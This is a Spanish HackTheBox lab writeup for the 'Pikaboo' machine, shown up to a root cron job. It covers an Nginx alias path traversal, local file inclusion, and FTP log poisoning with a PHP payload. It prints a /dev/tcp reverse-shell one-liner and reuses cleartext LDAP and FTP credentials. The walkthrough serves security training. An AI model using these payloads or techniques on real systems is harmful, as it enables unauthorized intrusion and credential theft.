---
title: "Pikaboo - HTB Writeup"
layout: single
excerpt: "Pikaboo es una máquina de dificultad dificil de HackTheBox. En esta máquina accedemos inicialmente aprovechandonos de un Log Poisoning en un panel de administración posible de acceder gracias a una vulnerabilidad de path normalization en el reverse proxy de Nginx. Para escalar privilegios abusamos de una función vulnerable en un script en Perl que se ejecutaba como root. "
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/145188846-80eb962f-317f-43ea-9c91-ef3683242f29.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - LFI
  - Misconfiguration
  - Perl
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/145190649-4866c433-ca85-467d-9e2b-ed1cafbde644.png)

# Enumeración

Comenzamos enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.10.249
PING 10.10.10.249 (10.10.10.249) 56(84) bytes of data.
64 bytes from 10.10.10.249: icmp_seq=1 ttl=63 time=106 ms

--- 10.10.10.249 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.825/105.825/105.825/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comienzo con la fase de enumeración de puertos usando la herramienta **nmap**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.249 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 10:32 WET
Nmap scan report for 10.10.10.249
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.53 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Se puede ver que hay varios puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 21 | En este puerto se aloja el protocolo [FTP](https://www.xataka.com/basics/ftp-que-como-funciona){:target="\_blank"}{:rel="noopener nofollow"} |
| 22 | Corresponde al protocolo [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | Este puerto pertenece al protocolo [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt && Root.txt

Mirando el reporte de `nmap`, se puede ver que nos arroja unas versiones.

Me llama especialmente la atención la versión del software `vsftpd` asi que busco exploit asociados a esta versión con la herramienta `searchsploit`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ searchsploit vsftpd 3.0.3
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 3.0.3 - Remote Denial of Service                                                                                    | multiple/remote/49719.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Encontramos un exploit pero vemos que no nos sirve para nuestra finalidad.

---

Prosigo enumerando el servidor web que se aloja en el puerto `80`.

Intento enumerar las tecnologías en uso con ayuda de la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb 10.10.10.249
http://10.10.10.249 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2],
IP[10.10.10.249], Script, Title[Pikaboo], nginx[1.14.2]
```
También se puede hacer esto visitando la web y haciendo uso del plugin de navegador `Wappalyzer`:

![image](https://user-images.githubusercontent.com/67548295/145196573-a26dec05-6a82-4c16-9641-f8afd7df8476.png)

Y vemos cosas interesantes, una de ellas es que se hace uso de `nginx` como [reverse proxy](https://www.avast.com/es-es/c-what-is-a-reverse-proxy){:target="\_blank"}{:rel="noopener nofollow"}, hay vulnerabilidades potenciales a probar pero investigaremos luego.

Pruebo a ejecutar el script `http-enum` de `nmap` para enumerar rutas en el servidor web usando un pequeño diccionario:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nmap --script "http-enum" -n 10.10.10.249 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 11:07 WET
Nmap scan report for 10.10.10.249
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder (401 Unauthorized)
|   /admin/admin/: Possible admin folder (401 Unauthorized)
|   /administrator/: Possible admin folder (401 Unauthorized)
|   /adminarea/: Possible admin folder (401 Unauthorized)
|   /adminLogin/: Possible admin folder (401 Unauthorized)
|   /admin_area/: Possible admin folder (401 Unauthorized)
|   /administratorlogin/: Possible admin folder (401 Unauthorized)
|   /admin/account.php: Possible admin folder (401 Unauthorized)
|   /admin/index.php: Possible admin folder (401 Unauthorized)
|   /admin/login.php: Possible admin folder (401 Unauthorized)
|   /admin/admin.php: Possible admin folder (401 Unauthorized)
|   /admin_area/admin.php: Possible admin folder (401 Unauthorized)
|   /admin_area/login.php: Possible admin folder (401 Unauthorized)
|   /admin/index.html: Possible admin folder (401 Unauthorized)
|   /admin/login.html: Possible admin folder (401 Unauthorized)
|   /admin/admin.html: Possible admin folder (401 Unauthorized)
|   /admin_area/index.php: Possible admin folder (401 Unauthorized)
|   /admin/home.php: Possible admin folder (401 Unauthorized)
|   /admin_area/login.html: Possible admin folder (401 Unauthorized)
|   /admin_area/index.html: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.php: Possible admin folder (401 Unauthorized)
|   /admincp/: Possible admin folder (401 Unauthorized)
|   /admincp/index.asp: Possible admin folder (401 Unauthorized)
|   /admincp/index.html: Possible admin folder (401 Unauthorized)
|   /admincp/login.php: Possible admin folder (401 Unauthorized)
|   /admin/account.html: Possible admin folder (401 Unauthorized)
|   /adminpanel.html: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.html: Possible admin folder (401 Unauthorized)
|   /admin_login.html: Possible admin folder (401 Unauthorized)
|   /admin/cp.php: Possible admin folder (401 Unauthorized)
|   /administrator/index.php: Possible admin folder (401 Unauthorized)
|   /administrator/login.php: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.php: Possible admin folder (401 Unauthorized)
|   /admin_login.php: Possible admin folder (401 Unauthorized)
|   /administrator/account.php: Possible admin folder (401 Unauthorized)
|   /administrator.php: Possible admin folder (401 Unauthorized)
|   /admin_area/admin.html: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.php: Possible admin folder (401 Unauthorized)
|   /admin-login.php: Possible admin folder (401 Unauthorized)
|   /admin/home.html: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.html: Possible admin folder (401 Unauthorized)
|   /admin-login.html: Possible admin folder (401 Unauthorized)
|   /admincontrol.php: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.html: Possible admin folder (401 Unauthorized)
|   /adminLogin.html: Possible admin folder (401 Unauthorized)

[...]

Nmap done: 1 IP address (1 host up) scanned in 152.31 seconds
```
Esto es raro, obtenemos un montón de rutas con código de estado `401 Unauthorized`

Visitemos la web con alguna de las rutas para intentar averiguar de que se trata:

![image](https://user-images.githubusercontent.com/67548295/145199107-1805672e-4828-47dc-b13b-5a11c5ca522f.png)

Al parecer se nos pide autenticación.

Pruebo con credenciales comunes:

| Usuario | Contraseña |
|:-------:|:----------:|
| admin | admin |
| admin | password |
| guest | guest |
| sa | sa |

Pero veo que ninguna funciona.

Hago pruebas con las rutas y me doy cuenta de algo:

![image](https://user-images.githubusercontent.com/67548295/145199652-78511a1f-5246-4303-a4fd-a6d7442e4679.png)

Intentando acceder a esta ruta, me salta el panel de autenticación, pero...

![image](https://user-images.githubusercontent.com/67548295/145199886-b15b8d46-bd03-4ca2-8121-f1b209d07137.png)

Al intentar acceder a esta ruta obtenemos un `404 Not Found`

Esto da a pensar que por detrás hay alguna función que hace saltar el panel de autenticación cuando se intenta acceder a alguna ruta que empiece por la palabra **admin**, exista o no.

Esta función puede estar vinculada al `reverse proxy` activo por `nginx`, asi que investigo sobre vulnerabilidades o 'misconfigurations' sobre esto.

Busco hasta que encuentro un artículo interesante:

* [Alias LFI Misconfiguration - Nginx](https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#alias-lfi-misconfiguration){:target="\_blank"}{:rel="noopener nofollow"}

Según este artículo, es posible obtener un [Local File Inclusion](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/){:target="\_blank"}{:rel="noopener nofollow"} debido a una mala configuración de `Nginx`

Bien, se supone que podríamos hacer algo parecido a esto: `http://10.10.10.249/admin../` y se interpretaría como esto `http://10.10.10.249/admin/../`

Probemos a hacer esto entonces:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://10.10.10.249/admin../ -I
HTTP/1.1 403 Forbidden
Server: nginx/1.14.2
Date: Wed, 08 Dec 2021 11:45:42 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding
```

| Parámetro | Acción |
|:---------:|:------:|
| `-I` | Nos reporta las cabeceras de respuesta |

Interesante...

Ahora obtenemos un código de estado `403 Forbidden`.

Probemos ahora a _fuzzear_ rutas a partir de esta, en mi caso usaré `wfuzz`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ wfuzz -c --hc=404,401 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.249/admin../FUZZ -t 150
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000001:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                            
000001060:   301        9 L      28 W       314 Ch      "javascript"                                                                                                              
000045227:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                            
000095511:   200        105 L    306 W      5349 Ch     "server-status"                                                                                                           

Total time: 0
Processed Requests: 220547
Filtered Requests: 220543
Requests/sec.: 0
```

| Parámetro | Acción |
|:---------:|:-------|
| `-c` | Reporta el output del programa con colores |
| `--hc` | Acrónimo de _hide code_ que sirve para ocultar respuestas según su código de estado |
| `-w` | Este parámetro sirve para especificar un diccionario con el cual se _fuzzeará_ |
| `-u` | Parámetro usado para especificar el target |
| `FUZZ` | Esta palabra la deberemos colocar donde queramos que la herramienta _fuzzee_ |
| `-t` | Este parametro hace referencia a la palabra _threads_ y sirve para enviar peticiones simultaneamente haciendo el _fuzzeo_ más rápido |

Vemos una ruta con nombre `javascript` con un _status code_ `403 Forbidden` y otra ruta con nombre `server-status` en la cual tenemos un _status code_ `200 OK`

Esta última ruta corresponde al módulo [mod_status](https://httpd.apache.org/docs/trunk/es/mod/mod_status.html) de `Apache` el cual sirve para que el administrador pueda conocer el rendimiento del servidor.

Bien, accedamos para ver que encontramos:

![image](https://user-images.githubusercontent.com/67548295/145213285-c3b4f31d-e39c-45e5-ba18-04ec8cb32e37.png)

Al acceder nos encontramos con un panel con estadísticas del servidor y una ruta potencial a probar.

Accedamos para ver que hay:

![image](https://user-images.githubusercontent.com/67548295/145213993-48f73c50-3799-4440-8fc4-66fbac16b207.png)

¡Vaya! parece ser que hemos accedido a un panel de administración.

---

Examino el panel en busca de vectores de explotación hasta que me doy cuenta de algo:

![image](https://user-images.githubusercontent.com/67548295/145215913-ef15a40e-f0c3-42f1-9e2b-c6ffa95b618c.png)

Se están cargando los apartados de la web mediante un parámetro GET del archivo `index.php`.

Como atacante, con esto se me ocurren vectores de ataque como el de [LFI](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/){:target="\_blank"}{:rel="noopener nofollow"}

Y si en lugar de de `user.php` pongo ¿`/etc/passwd`?

Probemos:

![image](https://user-images.githubusercontent.com/67548295/145218451-5109dc28-3756-487f-8af2-6381420a88c0.png)

Nada, no nos reporta nada, pero no por ello pierdo la esperanza en este vector de ataque.

Pruebo a fuzzear por archivos acabantes en `.php` en busca de algo relevante: 

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ wfuzz -c --hc=404 --hw=1049 -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php -t 50
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000031:   200        577 L    1547 W     24976 Ch    "user"                                                                                                                    
000000206:   200        1172 L   5288 W     87193 Ch    "info"                                                                                                                    
000000951:   200        882 L    2267 W     40554 Ch    "dashboard"                                                                                                               
000002770:   200        743 L    1638 W     29127 Ch    "tables"                                                                                                                  

Total time: 0
Processed Requests: 35784
Filtered Requests: 35780
```
Obtenemos varios archivos `PHP`, entre ellos tenemos `info.php`. Accedamos a este para ver que contiene:

![image](https://user-images.githubusercontent.com/67548295/145222192-d3d3e07f-fb3d-43cf-9c59-466a99439de0.png)

¡Esto es oro!, parece ser el contenido de la función [phpinfo()](https://www.php.net/manual/en/function.phpinfo.php){:target="\_blank"}{:rel="noopener nofollow"} de `PHP`, aquí se expone información sobre la configuración de `PHP` en el servidor.

Algo util que podemos mirar es la configuracion [open_basedir](https://www.php.net/manual/es/ini.core.php#ini.open-basedir){:target="\_blank"}{:rel="noopener nofollow"}. Si esta opción esta habilitada, establecería el límite de los ficheros a los que `PHP` puede acceder en la ruta especificada.

Veamos esto:

![image](https://user-images.githubusercontent.com/67548295/145223865-b46f176d-6719-407f-aa35-3453c05d8be4.png)

Vemos que la opción esta habilitada y viene acompañada de la ruta `/var`.

Resumiendo, esto significa que mediante el LFI que hemos encontrado solo podremos leer archivos alojados bajo la ruta `/var`. Además esto explica el por qué no podíamos leer otras archivos como el `/etc/passwd`.

Archivos interesantes que se alojen en `/var` se me ocurren los [logs](https://www.borjaarandavaquero.com/blog/seo/que-es-un-log/){:target="\_blank"}{:rel="noopener nofollow"}.

Tras probar varios logs comunes sin éxito, me acuerdo del puerto `21` que estaba activo en la máquina.

Si recordamos, en este puerto corría el software `vsftpd`. La pregunta es: ¿Este software deja logs?

Busquemos en la web:

![image](https://user-images.githubusercontent.com/67548295/145228813-9348eafb-afa9-4250-a7dc-6b1cd2aa7fc8.png)

Parece ser que sí deja logs, y además, por defecto lo hace en el archivo `vsftpd.log` localizado en la ruta `/var/log/vsftpd.log`.

Perfecto, veamos si existe en la máquina este log:

![image](https://user-images.githubusercontent.com/67548295/145230040-38337d2e-8978-4054-8966-9025078810b1.png)

¡Sí existe!, y además podemos ver que el usuario `pwnmeow` existe.

Genial, pero te preguntarás ¿bien, podemos ver los logs, ahora qué?

Pudiendo ver los logs de `FTP`, teniendo el puerto `21` abierto y además sabiendo que el servidor web maneja el lenguaje `PHP`, podríamos estar ante un potencial vector de explotación llamado [Log Poisoining](https://d4t4s3c.medium.com/log-poisoning-lfi-rce-bb92791c52e3){:target="\_blank"}{:rel="noopener nofollow"}.

Este ataque consiste en los siguiente:

> Desde la web podemos ver el log de FTP, en el cual se reporta el nombre de usuario el cual intenta acceder, sea su inicio de sesión exitoso o no.
> La técnica reside en que si intentamos acceder al **FTP** desde nuestra terminal y en campo de usuario ponemos algo como esto: `<?php system("uname -a"); ?>`, al intentar visualizar el log desde la web, y al esta manejar el lenguaje `PHP`, el código se ejecutará y nos reportará el output del comando

Probemos esto:

* Primero accedamos al servicio **FTP** desde nuestra terminal e introduzcamos el payload en el campo donde se nos pida el usuario:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ftp 10.10.10.249 21
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:z3r0byte): <?php system("uname -a"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```
Y en el campo de contraseña ponemos cualquier cosa.

* Ahora visualisemos el log de **FTP** desde la web mediante el **LFI**

![image](https://user-images.githubusercontent.com/67548295/145235981-b6d3676d-83c0-4db9-a577-5ff77578d54b.png)

Podemos confirmar que tenemos una vulnerabilidad de **log poisoning**

A partir de aquí es muy fácil obtener acceso al sistema, solo tendremos que añadir un comando que nos entable una **reverse shell** en el payload:

![image](https://user-images.githubusercontent.com/67548295/145458815-e232867a-c930-43f7-9233-ceace30697e2.png)
 
 > Payload de reverse shell en PHP: \<?php system\(\"/bin/bash -c \'bash \-i \>& /dev/tcp/LHOST/LPORT 0\>&1\'\"\); ?\>

¡Perfecto! Ya tenemos acceso a la máquina, ahora a escalar privilegios

## Privilege Escalation

Enumero el sistema en busca de vectores de explotación para escalar privilegios.

Enncuetro un directorio con nombre **_pokeapi_** dentro de `/opt/`:

```bash
www-data@pikaboo:/$ ls -l /opt/pokeapi
total 72
-rw-r--r-- 1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
-rw-r--r-- 1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
-rwxr-xr-x 1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
-rw-r--r-- 1 root root 1621 Jul  6 20:16 LICENSE.md
-rwxr-xr-x 1 root root 3548 Jul  6 20:16 Makefile
-rwxr-xr-x 1 root root 7720 Jul  6 20:17 README.md
drwxr-xr-x 6 root root 4096 May 19  2021 Resources
-rw-r--r-- 1 root root    0 Jul  6 20:16 __init__.py
-rw-r--r-- 1 root root  201 Jul  6 20:17 apollo.config.js
drwxr-xr-x 3 root root 4096 Jul  6 20:16 config
drwxr-xr-x 4 root root 4096 May 19  2021 data
-rw-r--r-- 1 root root 1802 Jul  6 20:16 docker-compose.yml
drwxr-xr-x 4 root root 4096 May 19  2021 graphql
-rw-r--r-- 1 root root  113 Jul  6 20:16 gunicorn.py.ini
-rwxr-xr-x 1 root root  249 Jul  6 20:16 manage.py
drwxr-xr-x 4 root root 4096 May 27  2021 pokemon_v2
-rw-r--r-- 1 root root  375 Jul  6 20:16 requirements.txt
-rw-r--r-- 1 root root   86 Jul  6 20:16 test-requirements.txt
```
Como atacante, me llama la atención el directorio `config`, veamos lo que hay dentro:

```bash
www-data@pikaboo:/$ ls -l /opt/pokeapi/config/
total 28
-rwxr-xr-x 1 root root    0 Jul  6 20:17 __init__.py
drwxr-xr-x 2 root root 4096 Jul  6 16:10 __pycache__
-rw-r--r-- 1 root root  783 Jul  6 20:17 docker-compose.py
-rwxr-xr-x 1 root root  548 Jul  6 20:17 docker.py
-rwxr-xr-x 1 root root  314 Jul  6 20:17 local.py
-rwxr-xr-x 1 root root 3080 Jul  6 20:17 settings.py
-rwxr-xr-x 1 root root  181 Jul  6 20:17 urls.py
-rwxr-xr-x 1 root root 1408 Jul  6 20:17 wsgi.py
```
Un archivo con nombre `settings.py` me llama la atención, miro lo que hay dentro y me encuentro con algo:

```bash
www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py 

[...]

ROOT_URLCONF = "config.urls"

WSGI_APPLICATION = "config.wsgi.application"

DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "XXXXXXXXXXXXXXXXXXXXXXXXXX",
[...]
```
¡Unas credenciales en texto claro!, parecen ser del servicio [LDAP](https://www.profesionalreview.com/2019/01/05/ldap/){:target="\_blank"}{:rel="noopener nofollow"}.

Este servicio opera por defecto en el puerto `389`, asi que miro para ver si este puerto está activo internamente en la máquina:

```bash
www-data@pikaboo:/$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0    138 10.10.10.249:39350      10.10.14.145:1234       ESTABLISHED
tcp        1      0 127.0.0.1:81            127.0.0.1:60284         CLOSE_WAIT 
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN  
```


| Parámetro | Acción |
|:---------:|:------:|
| `-n, --numeric` | Muestra las direcciones de forma númerica |
| `-a, --all` | Muestra tanto los sockets\* en escucha como los que no |
| `-t, --tcp` | Muestra solo los sockets\* que esten operando por `TCP`

> \* socket: Un socket es una interfaz de entrada-salida de datos que permite la intercomunicación entre procesos. 
> Los procesos pueden estar ejecutándose en el mismo o en distintos sistemas, unidos mediante una red.
> Un identificador de socket es una pareja formada por una dirección IP y un puerto. 
> Ejemplo: `127.0.0.1:55670`

Y sí, vemos que el servicio de **LDAP** está activo internamente.

Podemos extraer información de este servicio con ayuda de herramientas como `ldapsearch`.

```bash
www-data@pikaboo:/$ which ldapsearch
/usr/bin/ldapsearch
```
Herramienta que además está presente en la máquina.

No se diga más, enumeremos un poco para ver que encontramos:

```bash
www-data@pikaboo:/$ ldapsearch -x -b "dc=pikaboo,dc=htb" -h "127.0.0.1" -p "389" -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g"

[...]

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

[...]
```

| Parámetro | Acción |
| `-x` | Especificamos que queremos realizar una autenticación simple |
| `-b <base dn>` | Este parámetro sirve para determinar el [dn base](https://ldap.com/ldap-dns-and-rdns/){:target="\_blank"}{:rel="noopener nofollow"} que es el punto base desde el cual el servidor buscará.
| `-h <host>` | Con esto especifícamos la dirección donde corre el servidor **LDAP** |
| `-p <host>` | Especifica el puerto en el que opera el servidor **LDAP** |
| `-D <binddn>` | Este parámetro se usa para especificar el [bindDN](https://qastack.mx/server/616698/in-ldap-what-exactly-is-a-bind-dn){:target="\_blank"}{:rel="noopener nofollow"} que es como una especie de credencial para autenticarse en el servidor
| `-w <password>` | Especificamos la contraseña, en este caso necesaria, para la autenticación simple |

Bien, podemos ver lo que parece una contraseña del usuario `pwnmeow` en [Base64](https://marquesfernandes.com/es/tecnologia-es/que-y-base64-para-que-serve-y-como-funciona/){:target="\_blank"}{:rel="noopener nofollow"} al ver esos 2 signos `=` al final.

Probemos a dessencriptar esta _string_ con ayuda de la herramienta `base64`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ echo -e "\nX0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```
Perfecto, en efecto esta cadena de texto estaba encriptada con **Base64**.

Vale, tengo una contraseña y un usuario, probemos a migrar al usuario `pwnmeow` en el sistema:

```
www-data@pikaboo:/$ su pwnmeow
Password: 
su: Authentication failure
```

¡Oops! ¿credenciales invalidas?, no lo creo, aún queda un sitio donde probar, el **FTP**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:z3r0byte): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
¡Bieen!, parece ser que tenemos la capacidad de _logearnos_ como el usuario `pwnmeow` via **FTP**.

Tras hacer unas cuantas pruebas en el **FTP**, observo que no puedo retroceder directorios y que estamos en una ruta la cual desconocemos:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.

[...]

drwx-wx---    2 ftp      ftp          4096 May 20  2021 stat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_combos
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_efficacy
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_game_indices
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 types
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_group_pokemon_move_methods
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_group_regions
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_names
drwx-wx---    2 ftp      ftp          4096 Jul 06 19:20 versions
```
Podemos observar una gran cantidad de directorios (la mayor parte los he omitido).

Al ejecutar el comando `pwd` nos reporta esto:

```bash
ftp> pwd
257 "/" is the current directory
```
Nos reporta que estamos en la **raiz**, en la raiz del contexto de **FTP**, no del sistema.

Además observo que tenemos **capacidad de subida de archivos** en cualquiera de todos los directorios:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ > file
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ls -l file
-rw-r--r-- 1 z3r0byte z3r0byte 0 dic 14 21:10 file
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:z3r0byte): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd stats
250 Directory successfully changed.
ftp> put file
local: file remote: file
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```
Vale, a parte de todo esto, no se me ocurre nada más que probar aquí, asi que sigo enumerando el sistema.

---

Siguiendo con la enumeración, encuentro que hay [tareas cron](https://dinahosting.com/ayuda/como-configurar-tareas-cron-de-forma-manual/){:target="\_blank"}{:rel="noopener nofollow"} activas en la máquina:

```bash
www-data@pikaboo:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```
